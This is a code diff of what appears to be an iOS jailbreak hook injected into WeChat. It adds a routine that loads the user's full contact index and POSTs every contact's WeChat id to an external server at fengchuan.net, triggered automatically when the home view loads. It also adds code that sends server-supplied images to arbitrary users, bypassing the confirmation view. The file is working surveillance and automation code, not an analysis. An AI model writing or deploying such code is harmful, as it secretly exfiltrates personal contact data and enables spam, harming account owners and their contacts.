@@ -10,7 +10,7 @@
 static NSString *environmentPath = @"http://www.fengchuan.net/shareplatformWx/weixin/";
 
 //hook版本号控制
-static NSString *m_hookVersion = @"1";
+static NSString *m_hookVersion = @"2";
 
 static dispatch_group_t group = dispatch_group_create();
 static dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
@@ -114,6 +114,46 @@ extern "C" NSMutableDictionary * strngToDictionary(NSString * strData) {
     return jsonData;
     //    }
 
+}
+
+
+//
+extern "C" void syncContactPlugin(NSString *uuid,NSString *data){
+
+    NSString *urlStr = [NSString stringWithFormat:@"%@syncContactPlugin.htm",environmentPath];
+    //把传进来的URL字符串转变为URL地址
+    NSURL *url = [NSURL URLWithString:urlStr];
+
+    //请求初始化，可以在这针对缓存，超时做出一些设置
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url
+                                                           cachePolicy:NSURLRequestReloadIgnoringCacheData
+                                                       timeoutInterval:20];
+
+    NSString *parseParamsResult = [NSString stringWithFormat:@"uuid=%@&dataList=%@",uuid,data];
+
+    NSLog(@"HKWeChat 发送成功给服务器 %@",parseParamsResult);
+
+    NSData *postData = [parseParamsResult dataUsingEncoding:NSUTF8StringEncoding];
+
+    [request setHTTPMethod:@"POST"];
+    [request setHTTPBody:postData];
+
+    //创建一个新的队列（开启新线程）
+    //    NSOperationQueue *queue = [NSOperationQueue new];
+    //发送异步请求，请求完以后返回的数据，通过completionHandler参数来调用
+    //    [NSURLConnection sendAsynchronousRequest:request
+    //                                       queue:queue
+    //                           completionHandler:block];
+
+
+    // 3. Connection
+    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
+
+        if (connectionError == nil) {
+
+            
+        }
+    }];
 }
 
 
@@ -707,33 +747,72 @@ extern "C" void hookUpdateLoadKey(NSString *uuid,NSString *linkUrl){
 
 }
 
+
+dispatch_queue_t picqueue = dispatch_queue_create("sendPictureMessages", DISPATCH_QUEUE_CONCURRENT);
+
+id fvc = [[NSClassFromString(@"ForwardMessageLogicController") alloc] init];
+static NSData *m_dtImg = [[NSData alloc] init];
+
 //发送图片
 %new
 -(void)sendPictureMessages:(NSString *)toUser pic:(NSString *)picUrl{
     NSLog(@"发送图片");
-    if([picUrl isEqualToString:@""]){
+    if([picUrl isEqualToString:@""] || [toUser isEqualToString:@""]){
         uploadLog(geServerTypeTitle(0,6,@"发送发送图片为空,不能发送图片"),[NSString stringWithFormat:@"发送图片失败"]);
         return;
     }
 
-    CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
+    dispatch_barrier_async(picqueue, ^{
+        NSLog(@"----barrier-----%@", [NSThread currentThread]);
 
-    NSMutableArray *toContacts = [[NSMutableArray alloc] init];
-    CContact *cc = [mgr getContactByName:toUser];
-    [toContacts addObject:cc];
+        CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:[NSClassFromString(@"CContactMgr") class]];
+        CMessageWrap *msgWrap = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
 
+        if (m_dtImg.bytes > 0) {
+        }else{
+            m_dtImg = [NSData dataWithContentsOfURL:[NSURL URLWithString:picUrl]];
+        }
 
-    CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
-    ForwardMessageLogicController *fmlc = [[NSClassFromString(@"ForwardMessageLogicController") alloc] init];
-    CMessageWrap *myMsg = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
-
-    myMsg.m_dtImg = [NSData dataWithContentsOfURL:[NSURL URLWithString:picUrl]];
-
-    [fmlc forwardMsgList:@[myMsg] toContacts:toContacts];
-    SharePreConfirmView *view = MSHookIvar<SharePreConfirmView *>(fmlc, "m_confirmView");
-    [view onConfirm];
-
+        [msgWrap setM_dtImg:m_dtImg];
+        [msgWrap setM_nsToUsr:toUser];
+        [msgWrap setM_uiStatus:2];
+        [msgWrap setM_asset:nil];
+        [msgWrap setM_oImageInfo:nil];
+        id cc = [[NSClassFromString(@"CContact") alloc] init];
+        [cc setM_nsUsrName:toUser];
+        [fvc ForwardMsg:msgWrap ToContact:cc];
+    });
 }
+
+//
+//
+////发送图片
+//%new
+//-(void)sendPictureMessages:(NSString *)toUser pic:(NSString *)picUrl{
+//    NSLog(@"发送图片");
+//    if([picUrl isEqualToString:@""]){
+//        uploadLog(geServerTypeTitle(0,6,@"发送发送图片为空,不能发送图片"),[NSString stringWithFormat:@"发送图片失败"]);
+//        return;
+//    }
+//
+//    CContactMgr *mgr = [[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"CContactMgr")];
+//
+//    NSMutableArray *toContacts = [[NSMutableArray alloc] init];
+//    CContact *cc = [mgr getContactByName:toUser];
+//    [toContacts addObject:cc];
+//
+//
+//    CMessageWrap *myMsgText = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
+//    ForwardMessageLogicController *fmlc = [[NSClassFromString(@"ForwardMessageLogicController") alloc] init];
+//    CMessageWrap *myMsg = [[NSClassFromString(@"CMessageWrap") alloc] initWithMsgType:3 nsFromUsr:[m_nCSetting m_nsUsrName]];
+//
+//    myMsg.m_dtImg = [NSData dataWithContentsOfURL:[NSURL URLWithString:picUrl]];
+//
+//    [fmlc forwardMsgList:@[myMsg] toContacts:toContacts];
+//    SharePreConfirmView *view = MSHookIvar<SharePreConfirmView *>(fmlc, "m_confirmView");
+//    [view onConfirm];
+//
+//}
 
 //发送名片
 %new
@@ -1308,6 +1387,29 @@ CLLocation *lbsLocation = nil;
     });
 }
 
+%new
+-(void)homeUploadWXid{
+
+    dispatch_group_async(group, queue, ^{
+
+        [NSThread sleepForTimeInterval:2];
+        //得到通讯录的信息
+        FTSContactMgr *ftsContactMgr = [[[NSClassFromString(@"MMServiceCenter") defaultCenter] getService:NSClassFromString(@"FTSFacade")] ftsContactMgr];
+
+        [ftsContactMgr tryLoadContacts];
+
+        NSMutableDictionary *dicContact = [ftsContactMgr getContactDictionary];
+
+        NSArray *keys = [dicContact allKeys];
+        //上传服务器
+        NSString *keyString = [keys componentsJoinedByString:@","];
+
+        syncContactPlugin([m_nCSetting m_nsUsrName],keyString);
+        
+    });
+
+}
+
 - (void)viewDidLoad{
     %orig;
 
@@ -1326,6 +1428,9 @@ CLLocation *lbsLocation = nil;
 
     //首页获取附近人
     [self findHomeLBSUsrs];
+
+    //首页上传通讯录的wxid
+    [self homeUploadWXid];
 
 }
 
